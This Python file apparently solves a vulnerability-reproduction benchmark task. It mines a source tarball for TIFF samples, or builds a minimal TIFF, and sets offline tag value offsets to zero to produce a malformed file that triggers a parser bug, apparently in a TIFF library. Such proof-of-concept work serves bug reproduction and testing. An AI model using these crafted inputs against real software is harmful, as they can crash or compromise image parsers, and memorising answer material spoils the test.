import os
import tarfile
import struct
from typing import Optional, Tuple, List


_TYPE_SIZES = {
    1: 1,   # BYTE
    2: 1,   # ASCII
    3: 2,   # SHORT
    4: 4,   # LONG
    5: 8,   # RATIONAL
    6: 1,   # SBYTE
    7: 1,   # UNDEFINED
    8: 2,   # SSHORT
    9: 4,   # SLONG
    10: 8,  # SRATIONAL
    11: 4,  # FLOAT
    12: 8,  # DOUBLE
    13: 4,  # IFD
}


_PREFERRED_OFFLINE_TAGS = (282, 283, 284, 301, 318, 319, 320, 330, 34665, 34853, 37386, 37500)


def _u16(data: bytes, off: int, le: bool) -> int:
    if off < 0 or off + 2 > len(data):
        raise ValueError("u16 oob")
    return struct.unpack_from("<H" if le else ">H", data, off)[0]


def _u32(data: bytes, off: int, le: bool) -> int:
    if off < 0 or off + 4 > len(data):
        raise ValueError("u32 oob")
    return struct.unpack_from("<I" if le else ">I", data, off)[0]


def _parse_first_ifd_entries(data: bytes) -> Optional[Tuple[bool, int, List[Tuple[int, int, int, int, int]]]]:
    if len(data) < 8:
        return None
    b0, b1 = data[0], data[1]
    if b0 == 0x49 and b1 == 0x49:
        le = True
    elif b0 == 0x4D and b1 == 0x4D:
        le = False
    else:
        return None
    try:
        magic = _u16(data, 2, le)
    except ValueError:
        return None
    if magic != 42:
        return None
    try:
        ifd_off = _u32(data, 4, le)
    except ValueError:
        return None
    if ifd_off < 8 or ifd_off >= len(data):
        return None
    if ifd_off + 2 > len(data):
        return None
    try:
        num = _u16(data, ifd_off, le)
    except ValueError:
        return None
    base = ifd_off + 2
    needed = base + num * 12 + 4
    if needed > len(data):
        return None
    entries = []
    for i in range(num):
        eoff = base + i * 12
        try:
            tag = _u16(data, eoff, le)
            typ = _u16(data, eoff + 2, le)
            cnt = _u32(data, eoff + 4, le)
            valoff = _u32(data, eoff + 8, le)
        except ValueError:
            return None
        entries.append((tag, typ, cnt, valoff, eoff))
    return le, ifd_off, entries


def _patch_offline_tag_value_offset_zero(data: bytes) -> Optional[bytes]:
    parsed = _parse_first_ifd_entries(data)
    if not parsed:
        return None
    le, ifd_off, entries = parsed
    offline_candidates = []
    for tag, typ, cnt, valoff, eoff in entries:
        tsz = _TYPE_SIZES.get(typ)
        if tsz is None:
            continue
        try:
            total = tsz * cnt
        except Exception:
            continue
        if total > 4:
            offline_candidates.append((tag, typ, cnt, valoff, eoff, total))
    if not offline_candidates:
        return None

    preferred = None
    for pt in _PREFERRED_OFFLINE_TAGS:
        for cand in offline_candidates:
            if cand[0] == pt:
                preferred = cand
                break
        if preferred:
            break
    chosen = preferred if preferred else min(offline_candidates, key=lambda x: (0 if x[3] != 0 else 1, x[5], x[0]))

    tag, typ, cnt, valoff, eoff, total = chosen
    if valoff == 0:
        return data

    b = bytearray(data)
    b[eoff + 8:eoff + 12] = b"\x00\x00\x00\x00"
    return bytes(b)


def _build_minimal_tiff_poc() -> bytes:
    # Classic TIFF, little-endian, first IFD at offset 8.
    # Includes offline RATIONAL tags with value offsets of 0 (invalid offline tags).
    le = True
    hdr = bytearray()
    hdr += b"II"
    hdr += struct.pack("<H", 42)
    hdr += struct.pack("<I", 8)

    entries = []

    def add_entry(tag: int, typ: int, cnt: int, value_or_offset: int):
        entries.append((tag, typ, cnt, value_or_offset))

    # ImageWidth (256) LONG 1
    add_entry(256, 4, 1, 1)
    # ImageLength (257) LONG 1
    add_entry(257, 4, 1, 1)
    # XResolution (282) RATIONAL 1 => offline (8 bytes), invalid offset 0
    add_entry(282, 5, 1, 0)
    # YResolution (283) RATIONAL 1 => offline (8 bytes), invalid offset 0
    add_entry(283, 5, 1, 0)
    # ResolutionUnit (296) SHORT 1 => 2 (inch)
    # Value stored in the low 16 bits of the 4-byte field.
    add_entry(296, 3, 1, 2)

    ifd = bytearray()
    ifd += struct.pack("<H", len(entries))
    for tag, typ, cnt, vo in entries:
        ifd += struct.pack("<H", tag)
        ifd += struct.pack("<H", typ)
        ifd += struct.pack("<I", cnt)
        if typ == 3 and cnt == 1:
            ifd += struct.pack("<H", vo & 0xFFFF) + b"\x00\x00"
        else:
            ifd += struct.pack("<I", vo & 0xFFFFFFFF)
    ifd += struct.pack("<I", 0)  # next IFD offset

    return bytes(hdr + ifd)


class Solution:
    def solve(self, src_path: str) -> bytes:
        best: Optional[bytes] = None
        best_len = 1 << 60

        ext_ok = {".tif", ".tiff", ".dng", ".nef", ".cr2", ".arw", ".rw2", ".orf"}
        path_keywords = ("corpus", "seed", "testdata", "test_data", "fuzz", "fuzzer", "data", "sample", "samples", "tiff", "tif", "libertiff")

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isreg():
                        continue
                    if m.size < 8 or m.size > 200000:
                        continue
                    name = (m.name or "").lower()
                    base = os.path.basename(name)
                    _, ext = os.path.splitext(base)
                    is_likely = ext in ext_ok
                    if not is_likely:
                        if m.size > 6000:
                            continue
                        if not any(k in name for k in path_keywords):
                            continue
                        is_likely = True
                    if not is_likely:
                        continue
                    if m.size >= best_len:
                        continue

                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if len(data) != m.size:
                        data = data[:m.size]

                    if len(data) < 8:
                        continue
                    if not ((data[0:2] == b"II" and data[2:4] == b"\x2a\x00") or (data[0:2] == b"MM" and data[2:4] == b"\x00\x2a")):
                        continue

                    patched = _patch_offline_tag_value_offset_zero(data)
                    if patched is None:
                        continue

                    if len(patched) < best_len:
                        best = patched
                        best_len = len(patched)
                        if best_len <= 256:
                            break
        except Exception:
            best = None

        if best is not None:
            return best
        return _build_minimal_tiff_poc()